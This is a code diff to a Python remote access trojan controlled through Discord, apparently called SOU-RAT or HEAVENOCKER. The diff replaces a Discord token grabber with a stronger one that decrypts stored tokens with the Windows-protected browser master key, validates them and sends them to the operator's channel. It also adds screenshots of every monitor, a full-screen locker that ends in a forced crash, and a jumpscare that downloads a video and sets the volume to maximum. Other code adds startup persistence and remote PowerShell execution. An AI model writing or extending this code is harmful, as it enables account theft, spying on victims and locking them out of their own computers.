@@ -33,12 +33,23 @@ import tempfile
 from io import BytesIO
 from PIL import Image
 import threading
+import base64
+import json
+import os
+import re
+import requests
+from Cryptodome.Cipher import AES
+from discord import Embed
+from win32crypt import CryptUnprotectData
+from discord.ext import commands
+from discord import Intents
 from pynput import mouse
 import uuid
 import socket
 import cgi
 import win32com.client
 import traceback
+from PIL import ImageGrab
 
 def is_admin():
     """Check if the script is running with admin privileges."""
@@ -286,15 +297,29 @@ async def on_ready():
 @bot.command()
 async def ss(ctx):
     print("Screenshot command received!")
-    screenshot = pyautogui.screenshot()
-    screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
-    screenshot.save(screenshot_path)
 
-    embed = discord.Embed(title="Screenshot", color=0xa900db)
-    embed.set_image(url="attachment://screenshot.png")  # Set the image inside the embed
+    # Get all screen regions (multi-monitor setup)
+    screens = ImageGrab.grab(all_screens=True)
 
-    with open(screenshot_path, 'rb') as f:
-        await ctx.send(embed=embed, file=discord.File(f, 'screenshot.png'))
+    screenshots_paths = []
+    for index, screen in enumerate(screens):
+        screenshot_path = os.path.join(os.getenv('TEMP'), f'screenshot_monitor_{index + 1}.png')
+        screen.save(screenshot_path)
+        screenshots_paths.append(screenshot_path)
+
+    embed = discord.Embed(title="Screenshots", color=0xa900db)
+
+    # Attach screenshots to the Discord message
+    files = []
+    for screenshot_path in screenshots_paths:
+        files.append(discord.File(screenshot_path, os.path.basename(screenshot_path)))
+
+    # Send each screenshot in the embed or as files
+    await ctx.send(embed=embed, files=files)
+
+    # Clean up temporary files
+    for screenshot_path in screenshots_paths:
+        os.remove(screenshot_path)
 
 @bot.command()
 async def clear(ctx, amount: int = 100):
@@ -498,6 +523,7 @@ async def commands(ctx):
     embed2.add_field(name="🟢 .reagentc-enable", value="Enables back factory reset.", inline=False)
     embed2.add_field(name="🔴 .reagentc-disable", value="Disables factory reset.", inline=False)
     embed2.add_field(name="📩 .block-website [website_url]", value="blocks the website.", inline=False)
+    embed2.add_field(name="☠️ .jumpscare", value="Goes and jumpscapres you.", inline=False)
     await ctx.send(embed=embed2)
 
 @bot.command()
@@ -661,58 +687,6 @@ async def sr(ctx, duration: int = 30):  # Default duration is set to 30 seconds
     # Optionally, delete the video file after sending
     os.remove(video_path)
 
-
-@bot.command()
-async def token(ctx):
-    tokens = []
-    local = os.getenv("localAPPDATA")
-    roaming = os.getenv("APPDATA")
-    paths = {
-        "Discord": os.path.join(roaming, "Discord"),
-        "Discord Canary": os.path.join(roaming, "discordcanary"),
-        "Discord PTB": os.path.join(roaming, "discordptb"),
-        "Google Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default"),
-        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
-        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
-        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
-        "Lightcord": os.path.join(roaming, "Lightcord"),
-        "Opera GX": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
-        "Amigo": os.path.join(local, "Amigo", "User Data"),
-        "Torch": os.path.join(local, "Torch", "User Data"),
-        "Kometa": os.path.join(local, "Kometa", "User Data"),
-        "Orbitum": os.path.join(local, "Orbitum", "User Data"),
-        "CentBrowser": os.path.join(local, "CentBrowser", "User Data"),
-        "Sputnik": os.path.join(local, "Sputnik", "Sputnik", "User Data"),
-        "Chrome SxS": os.path.join(local, "Google", "Chrome SxS", "User Data"),
-        "Epic Privacy Browser": os.path.join(local, "Epic Privacy Browser", "User Data"),
-        "Microsoft Edge": os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
-        "Uran": os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
-        "Iridium": os.path.join(local, "Iridium", "User Data", "Default", "local Storage", "leveld"),
-        "Firefox": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
-    }
-
-    for platform, path in paths.items():
-        path = os.path.join(path, "local Storage", "leveldb")
-        if os.path.exists(path):
-            for file_name in os.listdir(path):
-                if file_name.endswith((".log", ".ldb", ".sqlite")):
-                    with open(os.path.join(path, file_name), errors="ignore") as file:
-                        for line in file:
-                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                                for token in re.findall(regex, line):
-                                    if f"{token} | {platform}" not in tokens:
-                                        tokens.append(f"{token} | {platform}")
-
-    # Creating the embed message
-    embed = discord.Embed(
-        title="TOKENS FOUND",
-        description="\n\n".join(tokens) if tokens else "No tokens found.",
-        color=8323249
-    )
-    
-    # Sending the embed message to the channel
-    await ctx.send(embed=embed)
-
 @bot.command()
 async def powershell(ctx, *, command: str):
     # Construct the PowerShell command to execute in the background
@@ -748,6 +722,7 @@ count = 3
 lock_window = None
 current_password = default_password  # Stores the current password
 
+
 def start_lock_window(password):
     """Function to create and display the lock window."""
     global lock_window
@@ -755,10 +730,10 @@ def start_lock_window(password):
     lock_window.title("HEAVENOCKER")
     lock_window["bg"] = "black"
     
-    Label(lock_window, bg="black", fg="red", text="WINDOWS LOCKED BY HEAVENOCKER\n\n\n", font="helvetica 75").pack()
-    Label(lock_window, bg="black", fg="red", text=lock_text, font="helvetica 40").pack(side=TOP)
+    Label(lock_window, bg="black", fg="pink", text="WINDOWS LOCKED BY HEAVENOCKER\n\n\n", font="helvetica 75").pack()
+    Label(lock_window, bg="black", fg="pink", text=lock_text, font="helvetica 40").pack(side=TOP)
 
-    enter_pass = Entry(lock_window, bg="black", fg="red", font="helvetica 35")
+    enter_pass = Entry(lock_window, bg="black", fg="pink", font="helvetica 35")
     enter_pass.pack()
     lock_window.resizable(0, 0)
 
@@ -766,32 +741,35 @@ def start_lock_window(password):
     lock_window.attributes('-topmost', True)
     lock_window.attributes('-fullscreen', True)
 
-    Button(lock_window, text='Unlock', padx="31", pady="19", bg='black', fg='red', font="helvetica 30", 
+    Button(lock_window, text='Unlock', padx="31", pady="19", bg='black', fg='pink', font="helvetica 30", 
            command=lambda: check_password(enter_pass.get(), password)).pack()
 
     for i in range(10):
-        Button(lock_window, text=str(i), padx="28", pady="19", bg='black', fg='red', font="helvetica 25", 
+        Button(lock_window, text=str(i), padx="28", pady="19", bg='black', fg='pink', font="helvetica 25", 
                command=partial(lambda x=str(i): enter_pass.insert(END, x))).pack(side=LEFT)
 
-    Button(lock_window, text='<', padx="28", pady="19", bg='black', fg='red', font="helvetica 25", 
+    Button(lock_window, text='<', padx="28", pady="19", bg='black', fg='pink', font="helvetica 25", 
            command=lambda: enter_pass.delete(-1, END)).pack(side=LEFT)
 
-    lock_window.protocol("WM_DELETE_WINDOW", lambda: messagebox.showwarning("HEAVENLOCKER", "Cannot close the lock window!"))
+    lock_window.protocol("WM_DELETE_WINDOW", lambda: messagebox.showwarning("SOULOCKED", "Cannot close the lock window!"))
     lock_window.mainloop()
 
 def check_password(entered_password, password):
     """Check if the entered password matches the stored password."""
     global count
     if entered_password == password:
-        messagebox.showinfo("SOU-RAT", "UNLOCKED SUCCESSFULLY")
+        messagebox.showinfo("HEAVENOCKER", "UNLOCKED SUCCESSFULLY")
         lock_window.destroy()  # Close the lock window
     else:
         count -= 1
         if count <= 0:
-            messagebox.showwarning("SOU-RAT", "Number of attempts expired.")
+            messagebox.showwarning("HEAVENOCKER", "Number of attempts expired.")
             bsod()  # Trigger BSOD function (assuming you have this defined elsewhere)
         else:
-            messagebox.showwarning("SOU-RAT", f"Wrong password. Available tries: {count}")
+            messagebox.showwarning("HEAVENOCKER", f"Wrong password. Available tries: {count}")
+
+# Define your Discord bot
+bot = commands.Bot(command_prefix="!")  # Replace '!' with your desired command prefix
 
 @bot.command()
 async def lock(ctx, *, password: str = default_password):
@@ -864,30 +842,33 @@ pygame.mixer.init()
 @bot.command()
 async def play(ctx, *, filename: str = None):
     if filename is None:
-        # Check if there are any attachments
+        # Handle attached file
         if ctx.message.attachments:
             attachment = ctx.message.attachments[0]
-            filename = attachment.filename
-            # Download the attachment to a temporary file
             temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".mp3")
             await attachment.save(temp_file.name)
             temp_file.close()
+            filename = temp_file.name  # Use the temporary file's name
         else:
             await ctx.send("No filename provided and no attachment found.")
             return
     else:
-        # Check if the file exists
+        # Check if the provided file exists
         if not os.path.isfile(filename):
             await ctx.send(f"File '{filename}' not found.")
             return
-    
+
     try:
-        # Play the specified .mp3 file
+        # Play the file
         pygame.mixer.music.load(filename)
         pygame.mixer.music.play()
         await ctx.send(f"Playing '{filename}'...")
     except Exception as e:
         await ctx.send(f"An error occurred while trying to play the file: {e}")
+    finally:
+        # Clean up the temporary file
+        if 'temp_file' in locals():
+            os.remove(temp_file.name)
 
 def turn_off_monitors():
     # This will turn off all monitors
@@ -1045,6 +1026,176 @@ async def block_website(ctx, website: str):
         await ctx.send("Permission denied. Ensure the bot is running with admin privileges.")
     except Exception as e:
         await ctx.send(f"An error occurred: {e}")
+
+@bot.command()
+async def jumpscare(ctx):
+    try:
+        # Download the jumpscare video
+        video_url = "https://github.com/AizenWo/Python/releases/download/Jumpscare/Jumpscare.mp4"
+        video_path = "Jumpscare.mp4"
+        await ctx.send("Downloading jumpscare video...")
+
+        response = requests.get(video_url, stream=True)
+        if response.status_code == 200:
+            with open(video_path, "wb") as video_file:
+                for chunk in response.iter_content(chunk_size=1024):
+                    video_file.write(chunk)
+        else:
+            await ctx.send("Failed to download jumpscare video.")
+            return
+
+        await ctx.send("Video downloaded successfully!")
+
+        # Set the system volume to 100%
+        await ctx.send("Maximizing volume...")
+        if os.name == "nt":  # For Windows
+            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+            from comtypes import CLSCTX_ALL
+
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(
+                IAudioEndpointVolume._iid_, CLSCTX_ALL, None
+            )
+            volume = interface.QueryInterface(IAudioEndpointVolume)
+            volume.SetMasterVolumeLevelScalar(1.0, None)  # Set volume to 100%
+        elif os.name == "posix":  # For macOS/Linux
+            subprocess.run("osascript -e 'set volume output volume 100'", shell=True)
+
+        # Open the video and make it fullscreen and topmost
+        await ctx.send("Playing jumpscare video...")
+        if os.name == "nt":  # For Windows
+            # Launch the video in fullscreen
+            player_process = subprocess.Popen(["start", video_path], shell=True)
+            time.sleep(1)  # Give the player time to launch
+
+            # Bring the video to the topmost position
+            hwnd = ctypes.windll.user32.FindWindowW(None, os.path.basename(video_path))
+            if hwnd:
+                ctypes.windll.user32.SetForegroundWindow(hwnd)
+                ctypes.windll.user32.ShowWindow(hwnd, 3)  # Maximize the window
+        elif os.name == "posix":  # For macOS/Linux
+            player_process = subprocess.Popen(["open", "-a", "VLC", "--args", "--fullscreen", video_path])
+
+        # Keep the video fullscreen and topmost for 10 seconds
+        time.sleep(10)
+
+        # Close the video player
+        player_process.terminate()
+        await ctx.send("Jumpscare complete!")
+
+        # Clean up the downloaded video
+        os.remove(video_path)
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+class grab_discord():
+    def initialize(raw_data):
+        return fetch_tokens().upload(raw_data)
+
+class extract_tokens:
+    def __init__(self) -> None:
+        self.base_url = "https://discord.com/api/v9/users/@me"
+        self.appdata = os.getenv("localappdata")
+        self.roaming = os.getenv("appdata")
+        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
+        self.tokens, self.uids = [], []
+        self.extract()
+
+    def extract(self) -> None:
+        paths = {
+            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
+            # Add other paths as needed...
+        }
+
+        for name, path in paths.items():
+            if not os.path.exists(path): continue
+            _discord = name.replace(" ", "").lower()
+            if "cord" in path:
+                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): continue
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]: continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for y in re.findall(self.regexp_enc, line):
+                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
+                    
+                            if self.validate_token(token):
+                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                if uid not in self.uids:
+                                    self.tokens.append(token)
+                                    self.uids.append(uid)
+            else:
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]: continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(self.regexp, line):
+                            if self.validate_token(token):
+                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                if uid not in self.uids:
+                                    self.tokens.append(token)
+                                    self.uids.append(uid)
+
+    def validate_token(self, token: str) -> bool:
+        r = requests.get(self.base_url, headers={'Authorization': token})
+        if r.status_code == 200: return True
+        return False
+    
+    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16]
+        
+        try:
+            # Try decoding as UTF-8
+            return decrypted_pass.decode('utf-8')
+        except UnicodeDecodeError:
+            # If UTF-8 decoding fails, attempt with another encoding (e.g., ISO-8859-1)
+            return decrypted_pass.decode('iso-8859-1', errors='ignore')  # Fallback to ISO-8859-1 or ignore errors
+
+    def get_master_key(self, path: str) -> str:
+        if not os.path.exists(path): return
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
+        with open(path, "r", encoding="utf-8") as f: c = f.read()
+        local_state = json.loads(c)
+
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+
+class fetch_tokens:
+    def __init__(self):
+        self.tokens = extract_tokens().tokens
+    
+    def upload(self, raw_data):
+        if not self.tokens:
+            return
+        final_to_return = []
+        for token in self.tokens:
+            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
+            username = user['username'] + '#' + user['discriminator']
+            user_id = user['id']
+            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
+            
+            embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
+            embed.set_thumbnail(url=avatar)
+            embed.add_field(name="📜 Token:", value=f"```{token}```", inline=False)
+            final_to_return.append(embed)
+        
+        return final_to_return
+    
+@bot.command()
+async def token(ctx):
+    raw_data = None  # Set raw_data to your preferred value if needed
+    fetched_data = fetch_tokens().upload(raw_data)
+    if fetched_data:
+        for embed in fetched_data:
+            await ctx.send(embed=embed)
+    else:
+        await ctx.send("No tokens found.")
 
 if __name__ == "__main__":
     add_startup_entries()
